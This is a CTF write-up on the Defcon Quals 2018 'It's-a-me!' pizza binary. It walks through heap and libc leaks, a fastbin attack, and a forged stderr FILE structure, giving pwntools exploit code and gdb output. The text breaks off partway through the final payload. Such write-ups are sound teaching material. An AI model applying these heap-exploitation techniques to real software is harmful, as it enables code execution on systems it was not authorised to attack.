@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Defcon Quals 2018 - It&#39;s-a-me! | kileak</title>
+
+
+
+
+
+<meta name="description" content="Defcon Quals 2018 - It&#39;s-a-me!">
+
+
+<meta name="keywords" content="defcon">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/defconquals18-itsame/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Defcon Quals 2018 - It's-a-me!</h1>
+      <p class="post-meta">May 14, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Defcon Quals 2018 - It’s-a me!
+<!--break--></p>
+
+  <p>‘We told you it was a bad idea.’ — The Italians (and every reasonable person)</p>
+
+  <p>83b1db91.quals2018.oooverflow.io:31337</p>
+
+  <p>Team: Samurai</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/itsame/mario">mario</a> <a href="https://kileak.github.io/assets/itsame/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/itsame/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/itsame/pow.py">pow.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Wellcom my friende!! It's-a me, Mario! Ready for pizza italiana vera?
+------------------- MAIN MENU -------------------
+(N)ew customer
+(L)ogin as customer
+(E)xit
+Choice: N
+Hello, what's your name? abc
+&gt;&gt; Welcome abc
+------------------- USER MENU -------------------
+(O)rder more pizzas
+(C)ook all pizzas
+(A)dmire cooked pizzas
+(L)eave
+Choice: O
+&gt;&gt; how many pizzas? 1
+Ordering pizza #1
+&gt;&gt; how many ingredients? 1 
+Tell me ingridient #1: 10
+Order is complete, thanks!
+------------------- USER MENU -------------------
+(O)rder more pizzas
+(C)ook all pizzas
+(A)dmire cooked pizzas
+(L)eave
+Choice: C
+Before I start cooking your pizzas, do you have anything to declare? Please explain: abc
+-------- COOKING PIZZA #1 --------
+Adding ingredient: 10
+Cooked new pizza:
+BadPizza: 10
+found non-approved pizzas. come on.</code></pre></figure>
+
+<p>So, it’s Mario, ready for some serious pizza cooking.</p>
+
+<p><code class="language-plaintext highlighter-rouge">aegis</code> and some other people already reversed most of the binary, when I joined the challenge, so I just went from there, picked up the available information and created an exploit for it.</p>
+
+<p>When we order a pizza containing only “valid” ingredients and cook it, Mario will ask us for a <code class="language-plaintext highlighter-rouge">declaration</code>. It will then allocate a buffer with the length of the declaration we came up with. When the pizza is approved, this declaration buffer will get freed.</p>
+
+<p>We can use this, to define how big the chunk should be, that gets allocated (and it also gives us some control over, where the chunk will be allocated on the heap, if we maintain an overview over the freed chunks on the heap).</p>
+
+<p>But, when we order a pizza with pineapples on it, Mario will get angry at us and asks for an <code class="language-plaintext highlighter-rouge">explanation</code>, why we did such a criminal thing and ban us afterwards.</p>
+
+<p>The trick here is to get to both code parts, such as cooking a criminal pizza, so Mario will be asking us for an explanation as well as cooking only valid pizzas, so Mario will free the declaraion buffer for us (so we can fill it with our explanation for the criminal pizza).</p>
+
+<p><code class="language-plaintext highlighter-rouge">aegis</code> pointed out, this can be achieved by cooking 16 pineapple pizzas and 1 tomato pizza:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Order pineapple pizzas to get this user banned"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+	<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\xff\xf0\x9f</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x8d\x8d</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+
+<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Before I start cooking your pizzas, do you have anything to declare? Please explain: $ Aa0Aa1Aa2Aa3A...
+-------- COOKING PIZZA #1 --------
+Adding ingredient: ����
+Adding ingredient: \x8d\x8d
+Adding ingredient: 🍅
+Cooked new pizza:
+CriminalPizza: ����\x8d\x8d🍅
+HOW IS IT POSSIBLE??? 🍍 here?? How could this order get here? this pizza is criminal.
+And this is the only thing you could say about your order: Aa0Aa1Aa2...
+are you serious?
+-------- COOKING PIZZA #2 --------
+Adding ingredient: ����
+Adding ingredient: \x8d\x8d
+Adding ingredient: 🍅
+Cooked new pizza:
+CriminalPizza: ����\x8d\x8d🍅
+HOW IS IT POSSIBLE??? 🍍 here?? How could this order get here? this pizza is criminal.
+And this is the only thing you could say about your order: Aa0Aa1Aa2Aa...
+
+...
+
+are you serious?
+-------- COOKING PIZZA #17 --------
+Adding ingredient: 🍅
+Cooked new pizza:
+ApprovedPizza: 🍅
+Molto bene, all cooked!
+------------------- USER MENU -------------------
+Mario upset. These are your choices:
+(P)lease, Mario, hear me out. Let me explain
+(Y)ou are right, putting pineapple on pizza is unforgivable. I'll go away and never come back.
+Choice: mmm '9', what's that? I donn't understande, Mario confused
+------------------- USER MENU -------------------
+Mario upset. These are your choices:
+(P)lease, Mario, hear me out. Let me explain
+(Y)ou are right, putting pineapple on pizza is unforgivable. I'll go away and never come back.</code></pre></figure>
+
+<p>If we now just back out, the <code class="language-plaintext highlighter-rouge">declaration</code> buffer will be freed (thus having a populated FD pointer at the start), and we’re able to leak it from the main menu, asking Mario, why he’s so angry.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create good user"</span><span class="p">)</span>
+
+<span class="n">new_customer</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">200</span><span class="p">)</span>
+<span class="n">leave</span><span class="p">()</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create first offending user"</span><span class="p">)</span>
+
+<span class="n">new_customer</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">200</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Order pineapple pizzas to get this user banned"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+	<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\xff\xf0\x9f</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x8d\x8d</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+
+<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Cook offending pizza to free explanation buffer"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">cook_pizzas</span><span class="p">(</span><span class="s">"X"</span><span class="o">*</span><span class="mi">300</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Withdraw to get heap leak from mario (from freed explanation)"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"Y"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"W"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"say: "</span><span class="p">)</span>
+<span class="n">HEAPLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"HEAPLEAK               : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Create good user
+[*] Create first offending user
+[*] Order pineapple pizzas to get this user banned
+[*] Cook offending pizza to free explanation buffer
+[*] Withdraw to get heap leak from mario (from freed explanation)
+[*] HEAPLEAK               : 0x5555557746c0</code></pre></figure>
+
+<p>Still, we would also like to know where <code class="language-plaintext highlighter-rouge">libc</code> is allocated. To achieve this, we’ll just create a criminal order again.</p>
+
+<p>But this time, we only create a fastbin chunk size <code class="language-plaintext highlighter-rouge">declaration</code>, which will serve us a fastbin, that’s located above the current user chunk.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x555555772e90:	0x0000000000000000	0x0000000000000021  &lt;= free fastbin chunk
+0x555555772ea0:	0x0000000000000000	0x0000555555773450
+0x555555772eb0:	0x0000555555773450	0x0000000000000031
+0x555555772ec0:	0x0000555555772c20	0x0000555555772d70
+0x555555772ed0:	0x0000555555772ef0	0x00005555557744b0
+0x555555772ee0:	0x0000000000000000	0x0000000000000051  &lt;= current user
+0x555555772ef0:	0x00005555557746d0	0x0000555555774dd0  &lt;= current user name
+0x555555772f00:	0x0000555555774f68	0x00005555557750d0
+0x555555772f10:	0x0000000000000000	0x0000000000000000
+0x555555772f20:	0x0000000000000000	0x0000000000000000
+0x555555772f30:	0x0000000000000001	0x0000000000000031</code></pre></figure>
+
+<p>If we now use the cooking trick again, the <code class="language-plaintext highlighter-rouge">declaration</code> buffer will be freed again, but since we’re still able to write into it. And since we can always enter 300 bytes for the <code class="language-plaintext highlighter-rouge">explanation</code>, we can overwrite the <code class="language-plaintext highlighter-rouge">user</code> chunk on the heap with this.</p>
+
+<p>So we’ll just be putting a pointer into the name, pointing to a libc address currently lurking around on the heap.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create another offending user"</span><span class="p">)</span>
+
+<span class="n">new_customer</span><span class="p">(</span><span class="s">"YAB"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Order pineapple pizzas to get this user banned"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+	<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\xff\xf0\x9f</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x8d\x8d</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+
+<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Cook pizzas to create free fastbin chunk above user table"</span><span class="p">)</span>
+	
+<span class="n">cook_pizzas</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x21</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"P"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite user name (of YAB) with a pointer to a libc address on the heap"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="mh">0x1aa0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="o">-</span><span class="mh">0x1950</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">-</span> <span class="mh">0x17d0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span><span class="o">-</span><span class="mh">0x210</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000000051</span><span class="p">)</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">HEAPLEAK</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span>                                  <span class="c1"># username
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak libc address from offending user"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"W"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"friend "</span><span class="p">)</span>
+<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mi">216</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Choice: "</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak              : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC                   : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>If we ask Mario now, why he’s offended, he’ll tell us, that our friend <code class="language-plaintext highlighter-rouge">libc main_arena pointer</code> has done something wrong:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">your friend �����\x7f ordered a pizza with 🍍 and I should stay calm?
+'That must be a mistake', you may say. But I asked, and this is what he had to say: 
+niente scuse</code></pre></figure>
+
+<p>Parsing this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Order pineapple pizzas to get this user banned
+[*] Cook offending pizza to free explanation buffer
+[*] Withdraw to get heap leak from mario (from freed explanation)
+[*] HEAPLEAK               : 0x5555557746c0
+[*] Create another offending user
+[*] Order pineapple pizzas to get this user banned
+[*] Cook pizzas to create free fastbin chunk above user table
+[*] Overwrite user name (of YAB) with a pointer to a libc address on the heap
+[*] Leak libc address from offending user
+[*] LIBC leak              : 0x7ffff7839bf8
+[*] LIBC                   : 0x7ffff7475000</code></pre></figure>
+
+<p>So, now we have all needed leaks to start doing something useful.</p>
+
+<p>We can now use the cooking trick to actually write into the already freed buffers, overwriting their <code class="language-plaintext highlighter-rouge">FD</code> pointer to create a fastbin attack.</p>
+
+<p>For achieving the chunks being allocated in the right order, I went this way:</p>
+
+<ul>
+  <li>Prepare a user with an offending order (don’t cook it by now)</li>
+  <li>Login with another user, order and cook an offending order
+    <ul>
+      <li>Use size <code class="language-plaintext highlighter-rouge">0x70</code> for the declaration, which will then get freed giving us a <code class="language-plaintext highlighter-rouge">0x70</code> freed fastbin</li>
+      <li>Write a misaligned address into the FD of this chunk pointing above <code class="language-plaintext highlighter-rouge">stderr</code></li>
+    </ul>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"># Misaligned pointer into _nl_global_locale
+
+0x7ffff783a4fd &lt;_nl_global_locale+221&gt;: 0xfff760395700007f	0x000000000000007f
+0x7ffff783a50d:                         0x0000000000000000	0x0000000000000000
+0x7ffff783a51d:                         0xfff783a540000000	0x000000000000007f
+0x7ffff783a52d:                         0x0000000000000000	0x0000000000000000
+0x7ffff783a53d:                         0x00fbad2087000000	0xfff783a5c3000000
+0x7ffff783a54d &lt;_IO_2_1_stderr_+13&gt;:    0xfff783a5c300007f	0xfff783a5c300007f
+0x7ffff783a55d &lt;_IO_2_1_stderr_+29&gt;:    0xfff783a5c300007f	0xfff783a5c300007f</code></pre></figure>
+
+<p>If we use <code class="language-plaintext highlighter-rouge">0x7ffff783a4fd</code> for overwriting the <code class="language-plaintext highlighter-rouge">FD</code> pointer of the currently freed <code class="language-plaintext highlighter-rouge">0x70</code> fastbin chunk, it will think that there’s a valid fastbin (with size <code class="language-plaintext highlighter-rouge">0x7f</code>) on the next allocations.</p>
+
+<p>Then, we’ll create another customer, which will just try to cook an invalid pizza (not criminal though) and also specifying a declaration of <code class="language-plaintext highlighter-rouge">0x70</code> size. This will allocate the currently freed fastbin chunk and putting its <code class="language-plaintext highlighter-rouge">FD</code> into fastbin list (which happens to be our misaligned pointer into <code class="language-plaintext highlighter-rouge">_nl_global_locale</code>).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ p main_arena
+$5 = {
+  mutex = 0x0, 
+  flags = 0x0, 
+  fastbinsY = {0x0, 0x555555772eb0, 0x0, 0x0, 0x0, 0x7ffff783a4fd &lt;_nl_global_locale+221&gt;, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x555555777420, 
+  last_remainder = 0x555555776e20, </code></pre></figure>
+
+<p>Now, we’ll switch back to the user, which already placed his criminal order but didn’t cook it by now.</p>
+
+<p>If we now cook this, the declaration can overwrite the <code class="language-plaintext highlighter-rouge">stderr</code> file structure. But we have to keep in mind, that we’re not allowed to put any null bytes there, since the binary will check the length of the declaration buffer with <code class="language-plaintext highlighter-rouge">strlen</code> first and only allocate that much space (so we won’t get that <code class="language-plaintext highlighter-rouge">0x70</code> buffer, if we used null bytes in it).</p>
+
+<p>BUT in the explanation, why we cooked a criminal pizza, we’re allowed to just put 300 bytes there (no <code class="language-plaintext highlighter-rouge">strlen</code> or <code class="language-plaintext highlighter-rouge">strcpy</code> involved), so we can abuse that to get the final overwrite.</p>
+
+<ul>
+  <li>Cook the criminal order with a <code class="language-plaintext highlighter-rouge">0x70</code> declaration
+    <ul>
+      <li>This will now allocate a chunk overlapping <code class="language-plaintext highlighter-rouge">stderr</code></li>
+      <li>The <code class="language-plaintext highlighter-rouge">declaration</code> buffer will get freed again</li>
+      <li>Put 0x70 <code class="language-plaintext highlighter-rouge">A</code>s there via <code class="language-plaintext highlighter-rouge">explanation</code> to get the chunk right</li>
+    </ul>
+  </li>
+  <li>Mario now asks us for an explanation (the buffer now points to the just freed declaration)
+    <ul>
+      <li>We’re now free to put 300 arbitrary bytes overwriting <code class="language-plaintext highlighter-rouge">sdterr</code></li>
+    </ul>
+  </li>
+</ul>
+
+<p>Preparing this</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create another user and order offending pizzas"</span><span class="p">)</span>
+
+<span class="n">new_customer</span><span class="p">(</span><span class="s">"WAITER"</span><span class="p">)</span>
+
+<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\xff\xf0\x9f</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x8d\x8d</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+<span class="n">leave</span><span class="p">()</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Login with first user (still good) and offend mario"</span><span class="p">)</span>
+<span class="n">login</span><span class="p">(</span><span class="s">"B"</span><span class="o">*</span><span class="mi">200</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+	<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\xff\xf0\x9f</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\x8d\x8d</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+
+<span class="n">order_pizza</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">[[</span><span class="s">"</span><span class="se">\xf0\x9f\x8d\x85</span><span class="s">"</span><span class="p">]])</span>
+
+<span class="n">cook_pizzas</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span>
+	
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Explanation buffer points to currently freed fastbin. Overwrite FD pointer to point above stderr _IO_file structure."</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"P"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3c54fd</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create another customer and cook a pizza to allocate 0x70 fastbin to get fake FD pointer into fastbin list"</span><span class="p">)</span>
+
+<span class="n">new_customer</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+<span class="n">cook_pizzas</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span>
+<span class="n">leave</span><span class="p">()</span>
+	
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Login with user waiting with offending order"</span><span class="p">)</span>	
+
+<span class="n">login</span><span class="p">(</span><span class="s">"WAITER"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Cook offending order. This will alocate pointer to stderr and overwrite it with As"</span><span class="p">)</span>
+
+<span class="n">cook_pizzas</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span></code></pre></figure>
+
+<p>Mario will now be waiting for a proper explanation. Well, here’s our poor excuse for making him angry:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Use explanation to overwrite stderr _IO_file"</span><span class="p">)</span>
+	
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"P"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">19</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3c5540</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                           <span class="c1"># flags
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
